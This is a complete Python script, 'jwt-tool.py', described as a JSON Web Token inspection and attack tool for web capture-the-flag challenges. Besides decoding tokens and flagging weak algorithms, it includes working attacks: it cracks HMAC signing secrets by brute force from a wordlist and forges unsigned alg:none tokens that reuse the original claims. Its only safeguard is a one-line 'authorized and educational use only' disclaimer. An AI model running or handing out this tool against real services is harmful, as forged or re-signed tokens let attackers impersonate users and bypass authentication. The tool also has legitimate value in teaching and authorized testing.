#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
jwt-tool.py - Inspect and attack JSON Web Tokens, the way web CTFs need.

By default it decodes the header and payload, resolves the timestamp claims and
raises the common weaknesses (alg:none accepted, HS256 that a public key could
sign). With a key it verifies HS256; with a wordlist it dictionary-cracks the
HS256 secret; with --forge-none it emits an unsigned alg:none token.

Only against tokens you are authorized to test. Educational use only.

Examples:
    python3 jwt-tool.py <token>
    python3 jwt-tool.py <token> --secret s3cr3t
    python3 jwt-tool.py <token> --wordlist /usr/share/wordlists/rockyou.txt
    python3 jwt-tool.py <token> --forge-none
"""

import argparse
import base64
import binascii
import datetime as dt
import hashlib
import hmac
import json
import sys


def b64url_decode(part):
    """Decode a base64url segment, tolerating missing padding."""
    pad = "-" * 0 + "=" * (-len(part) % 4)
    return base64.urlsafe_b64decode(part + pad)


def b64url_encode(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


def split_token(token):
    parts = token.strip().split(".")
    if len(parts) != 3:
        sys.exit("[-] Not a JWT: expected three dot-separated segments.")
    return parts


def hs_sign(signing_input, secret, alg):
    digestmod = {"HS256": hashlib.sha256,
                 "HS384": hashlib.sha384,
                 "HS512": hashlib.sha512}[alg]
    return hmac.new(secret, signing_input, digestmod).digest()


def pretty(label, raw):
    try:
        obj = json.loads(raw)
    except json.JSONDecodeError:
        print(f"[{label}] (not JSON) {raw!r}")
        return {}
    print(f"[{label}]")
    print(json.dumps(obj, indent=2, ensure_ascii=False))
    return obj


def show_times(payload):
    """Print the time-based claims as readable UTC, flagging expiry."""
    now = dt.datetime.now(dt.timezone.utc)
    labels = {"iat": "issued at", "nbf": "not before", "exp": "expires"}
    for claim, text in labels.items():
        if claim not in payload:
            continue
        try:
            when = dt.datetime.fromtimestamp(payload[claim], dt.timezone.utc)
        except (TypeError, ValueError, OverflowError):
            continue
        tag = ""
        if claim == "exp":
            tag = "  <-- EXPIRED" if when < now else "  (still valid)"
        print(f"  {text:<12} {when.isoformat()}{tag}")


def warnings(header):
    alg = str(header.get("alg", "")).lower()
    out = []
    if alg == "none":
        out.append("alg=none: signature not checked. Try a tampered payload "
                   "with an empty signature.")
    if alg.startswith("hs"):
        out.append("HS256/384/512: symmetric. If the server also accepts RS256, "
                   "an alg-confusion attack may let its public key sign tokens.")
        out.append("Weak or guessable secret? Try --wordlist to crack it.")
    return out


def crack_hs(parts, header, wordlist):
    """Return the first wordlist entry whose HMAC matches the signature, or None."""
    alg = header.get("alg", "HS256")
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        target = b64url_decode(parts[2])
    except (ValueError, binascii.Error):
        sys.exit("[-] Signature segment is not valid base64url.")
    with open(wordlist, "rb") as f:
        for line in f:
            secret = line.rstrip(b"\r\n")
            if not secret:
                continue
            if hmac.compare_digest(hs_sign(signing_input, secret, alg), target):
                return secret.decode("utf-8", "replace")
    return None


def forge_none(parts):
    """Emit an alg:none token that keeps the original payload."""
    header = {"alg": "none", "typ": "JWT"}
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    return f"{h}.{parts[1]}."


def main():
    p = argparse.ArgumentParser(
        description="Inspect and attack JSON Web Tokens.",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("token", nargs="?", help="the JWT ('-'/omit reads stdin)")
    p.add_argument("--secret", help="verify an HS* signature with this key")
    p.add_argument("-w", "--wordlist", help="dictionary-crack the HS* secret")
    p.add_argument("--forge-none", action="store_true",
                   help="print an alg:none token reusing the payload")
    args = p.parse_args()

    token = args.token
    if token in (None, "-"):
        token = sys.stdin.read().strip()
    parts = split_token(token)

    try:
        header = pretty("header", b64url_decode(parts[0]))
        payload = pretty("payload", b64url_decode(parts[1]))
    except (ValueError, binascii.Error):
        sys.exit("[-] Header/payload is not valid base64url.")

    show_times(payload)

    warns = warnings(header)
    if warns:
        print("\n[!] Notes:")
        for w in warns:
            print(f"  - {w}")

    if args.secret:
        alg = header.get("alg", "HS256")
        if not str(alg).upper().startswith("HS"):
            print(f"\n[-] --secret only verifies HS*, token alg is {alg}.")
        else:
            signing_input = f"{parts[0]}.{parts[1]}".encode()
            expected = hs_sign(signing_input, args.secret.encode(), alg)
            ok = hmac.compare_digest(expected, b64url_decode(parts[2]))
            print(f"\n[+] Signature {'VALID' if ok else 'INVALID'} for that secret.")

    if args.wordlist:
        found = crack_hs(parts, header, args.wordlist)
        if found is not None:
            print(f"\n[+] Secret found: {found!r}")
        else:
            print("\n[-] Secret not in wordlist.")

    if args.forge_none:
        print(f"\n[+] alg:none token:\n{forge_none(parts)}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(130)
    except FileNotFoundError as e:
        sys.exit(f"[-] {e}")
